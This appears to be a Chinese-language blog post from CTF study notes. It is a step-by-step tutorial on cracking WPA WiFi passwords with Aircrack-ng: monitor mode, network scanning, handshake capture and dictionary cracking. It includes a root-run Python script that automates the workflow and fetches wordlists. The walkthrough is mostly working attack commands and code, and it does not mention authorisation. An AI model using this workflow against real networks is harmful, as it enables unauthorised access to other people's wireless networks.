---
title: CTF学习笔记（大学篇）04 —— 使用Aircrack-ng来破解WIFI
date: 2022-06-01 12:44:46
tags: [CTF, WIFI, aircrack]
categories: CTF
---

{% note info %}

Aircrack-ng 官网：https://www.aircrack-ng.org/

{% endnote %}

Aircrack-ng是用来破解WIFI密码的工具，原理就是先寻找要破解的WIFI，然后把设备T下线，伪装成热点，让其他设备连接到伪装热点上获取握手包，最后跑字典把密码跑出来

说白了就是字典里面如果有就是有，没有那就没戏，所以其实用处嘛……

## Aircrack-Ng 安装

Kali其实自带了这个东西，但是对于大部分的Linux发行版是不带的，所以我们需要进行安装

最简单的方式就是直接通过apt进行安装

```bash
sudo apt update
sudo apt install aircrack-ng -y
```

我这里因为装过了所以才是这么提示的，如果没装过会进入正常的apt安装流程

![](https://assets.bili33.top/img/CTF-in-College-4/vmware-20220601-163848.png?download=true)

## 网卡设置

我这里自己插了一张AWUS036H网卡（显示为wlan0），某宝从几十块到几百的都有，那我这张自然是白嫖的嘛

![](https://assets.bili33.top/img/CTF-in-College-4/vmware-20220601-164831.png?download=true)

顺带上一张实物图

![](https://assets.bili33.top/img/CTF-in-College-4/IMG_20220601_164945.jpg)

要开始使用Aircrack-ng，就需要把网卡设置为监听模式，不过这个设置Aircrack-ng里面有一键化的命令，我们只需要执行

```bash
sudo airmon-ng start <网卡名字>
```

就可以打开监听模式了，对于我这里，我需要输入的为

```bash
sudo airmon-ng start wlan0
```

![](https://assets.bili33.top/img/CTF-in-College-4/vmware-20220601-165742.png)

（我这里因为开过一次，所以就会有两个进程在用这个网卡，根据它里面所说的用`airmon-ng check kill`先杀掉相关进程后重新开启就可以了）

完成后，原网卡的名字后面会多出`mon`的字样，就像这样

![](https://assets.bili33.top/img/CTF-in-College-4/vmware-20220601-165917.png)

## 搜索网络

使用`airodump-ng <网卡名字>`可以进入搜索模式

```bash
sudo airodump-ng wlan0mon
```

然后会开始搜索附近的WIFI，按两下<kbd>Q</kbd>可以退出搜索

![](https://assets.bili33.top/img/CTF-in-College-4/vmware-20220601-171049.png)

`BSSID` 是搜索到的WIFI的MAC地址

`PWR` 不清楚，但是用不到

`Beacons` 不清楚，但是也用不到

`#Data, #/s` 数据量（我猜的）

`CH` 即Channel，WIFI的频道

`MB` 不清楚，也用不到

`ENC CIPHER` 加密协议的版本

`AUTH` 认证方式（PSK即密码）

`ESSID` WIFI名称

我们需要记下`BSSID` `CHANNEL` 这两个东西，在抓取握手包会用到，记完了以后按两下<kbd>Q</kbd>退出搜索就可以了

## 抓取握手包

使用`airodump-ng -w {path} --channel {channel} --bssid {bssid} {netcard}`能够抓取握手包

`path`就是保存文件的路径

`channel` 频道，上面说过了

`bssid` WIFI的MAC地址，上面也说过了

`netcard` 你想使用的网卡

我这里就直接输入下面这个命令来抓取`Raspberry`这个WIFI的握手包（Packets文件夹已经提前新建完成）

```bash
sudo airodump-ng -w ./Packets/captured --channel 11 --bssid 5E:E4:2A:0D:4B:75 wlan0mon
```

网卡会进入抓取模式，这个过程可以按两下<kbd>Q</kbd>退出抓取

需要注意的是，抓取过程中，其他设备必须与该WIFI进行至少一次的连接（从不在该网络连接到该网络）

抓完后，会出现如图的这些文件

![](https://assets.bili33.top/img/CTF-in-College-4/vmware-20220601-172022.png)

我们要用来破解的就是这个`captured-01.cap`，至于为什么有01，因为aircrack-ng怕你重名，所以在文件后面会加上数字

## 破解WIFI密码

使用命令`aircrack-ng {path} -w {dictionary}`来破解WIFI密码

`path` 是要破解的`cap`文件的后缀，我这里就应该填`./Packets/captured-01.cap`

`dictionary` 是要用来破解WIFI跑的字典（字典可以访问[代码浏览 - WIFI - 常用字典 - GamerNoTitle的团队 (coding.net)](https://gamernotitle.coding.net/p/Dictionarys/d/WIFI/git)获取）

组合起来，我这里输入命令（wpa.txt是我电脑里面已经存在的字典）

```bash
sudo aircrack-ng ./Packets/captured-01.cap -w wpa.txt
```

然后就会开始跑字典，跑完了就会显示了（我这里没有跑，因为太慢了）

## 一键化Python程序

需要记住这么多命令是不是很烦，这里我自己做了个Aircrack-ng的Python程序，来避免记这么多的程序。需要注意：这个程序只能在Linux上运行，并且需要以root权限运行（因为aircrack的大部分命令都需要root权限）

下面贴出程序，你也可以通过[CTF-Scripts/WlanCrack.py at master · GamerNoTitle/CTF-Scripts (github.com)](https://github.com/GamerNoTitle/CTF-Scripts/blob/master/WlanCrack.py)获取。本程序在字典方面跟我上面的那个coding的库进行了链接，如果没有提供字典的话可以从coding库下载

**需要安装的Python轮子：`requests` `tqdm` `pprint`**

```python
import os
import requests
from pprint import pformat
from tqdm import tqdm

PreviousOutput = None
output = None
ListeningMode = False
PreviousPath = None


def ShowNetCard():
    output = os.popen('ifconfig')
    data = output.read()
    print(data)
    return data


def StartListenerMode(netcard):
    os.system('airmon-ng check kill')
    os.system(f'airmon-ng start {netcard}')
    global ListeningMode
    ListeningMode = True
    print('Started')


def DumpStatus(NetCard):
    print('Double-press Q to exit. When you are ready, press enter.')
    input()
    os.system(f'airodump-ng {NetCard}')


def CapturePacket(channel: int, bssid: str, netcard: str, path='./captured'):
    print('Double-press Q to exit. When you are ready, press enter.')
    input()
    os.system(
        f'airodump-ng -w {path} --channel {channel} --bssid {bssid} {netcard}')


def CrackWithDict(path, dictionary):
    os.system('airmon-ng check kill')
    os.system(f'aircrack-ng {path} -w {dictionary}')


def Downloader(url: str, filename: str):
    resp = requests.get(url, stream=True)
    total = int(resp.headers.get('content-length', 0))
    with open(filename, 'wb') as file, tqdm(
        desc=filename,
        total=total,
        unit='iB',
        unit_scale=True,
        unit_divisor=1024,
    ) as bar:
        for data in resp.iter_content(chunk_size=1024):
            size = file.write(data)
            bar.update(size)


help_msg = '''{:=^80}
[0] Show netcards
[1] Start listener
[2] Dump wlan status
[3] Capture heartbeat packet
[4] Crack the packet with a dictionary
[9] Install aircrack-ng (If you haven\'t install it on your computer)
[q] Exit
{:=^80}
'''.format(' Aircrack-Ng Script ', ' Made by GamerNoTitle ')

LogoPrint = r'''           _                         _           _   _          _____           _       _   
     /\   (_)                       | |         | \ | |        / ____|         (_)     | |  
    /  \   _ _ __ ___ _ __ __ _  ___| | ________|  \| | __ _  | (___   ___ _ __ _ _ __ | |_ 
   / /\ \ | | '__/ __| '__/ _` |/ __| |/ /______| . ` |/ _` |  \___ \ / __| '__| | '_ \| __|
  / ____ \| | | | (__| | | (_| | (__|   <       | |\  | (_| |  ____) | (__| |  | | |_) | |_ 
 /_/    \_\_|_|  \___|_|  \__,_|\___|_|\_\      |_| \_|\__, | |_____/ \___|_|  |_| .__/ \__|
                                                        __/ |                    | |        
                                                       |___/                     |_|        -- GamerNoTitle '''

if __name__ == '__main__':
    print(LogoPrint)
    if os.geteuid() != 0:
        print('You need to run it as root!')
        os._exit(0)
    while True:
        print(help_msg)
        Input = input('Please choose an option: ')
        if Input == '0':
            CardsInfo = ShowNetCard()
        if Input == '1':
            Netcard = input(
                'Please type the netcard\'s name that you wanna use: ')
            if 'wlan' not in Netcard:
                print(f'Unsupported netcard! {Netcard}')
            else:
                StartListenerMode(Netcard)
        if Input == '2':
            if ListeningMode:
                Netcard = input(
                    'Please type the netcard\'s name that you wanna use: ')
                NetCards = CardsInfo.split('\n\n')
                if 'wlan' not in Netcard:
                    print(f'Unsupported netcard! {Netcard}')
                else:
                    HaveCard = False
                    for i in NetCards:
                        if Netcard in i:
                            HaveCard = True
                    if HaveCard:
                        DumpStatus(Netcard)
                    else:
                        print(
                            f'Unable to find netcard {Netcard} in {NetCards}')
            else:
                print('You need to start the listener first!')
        if Input == '3':
            path = input(
                'Please input the path that you want to save the file (e.g: ./captured): ')
            PreviousPath = path
            channel = int(
                input('Please input the channel that you want to listen to: '))
            bssid = input('Please input the bssid you want to listen to: ')
            netcard = input('Please input the netcard you want to use: ')
            if path == '' or channel == '' or bssid == '' or netcard == '':
                print('Invalid parameters!')
            else:
                CapturePacket(channel=channel, bssid=bssid,
                              netcard=netcard, path=path)
        if Input == '4':
            path = input(
                f'Please input the file you want to crack (Default for the previous file {PreviousPath}): ')
            if path == '':
                path = PreviousPath
            dictionary = input(
                'Please input the dictionary that you want to use to crack: ')
            if dictionary == '':
                print('You haven\'t specify a dictionary to crack the packet! Do you need some dictionarys? The avaliable dictionarys are listed below: ')
                dictionarys = requests.get(
                    'https://gamernotitle.coding.net/p/Dictionarys/d/WIFI/git/raw/master/metadata.json?download=true').json()
                print(pformat(dictionarys))
                option = input(
                    'Please input the name of the dictionary you want to use: ')
                if option == '':
                    print('You need to specify a dictionary to crack the packet!')
                else:
                    Downloader(dictionarys['data'][option]
                               ['link'], f'./{option}.txt')
                    dictionary = f'{option}.txt'
                    print(
                        f'Start cracking {path} with dictionary {dictionary}')
                    CrackWithDict(path, dictionary)
            else:
                print(f'Start cracking {path} with dictionary {dictionary}')
                CrackWithDict(path, dictionary)
        if Input == '9':
            os.system('apt update')
            os.system('apt install aircrack-ng -y')
        if Input == 'q':
            os._exit(0)
```

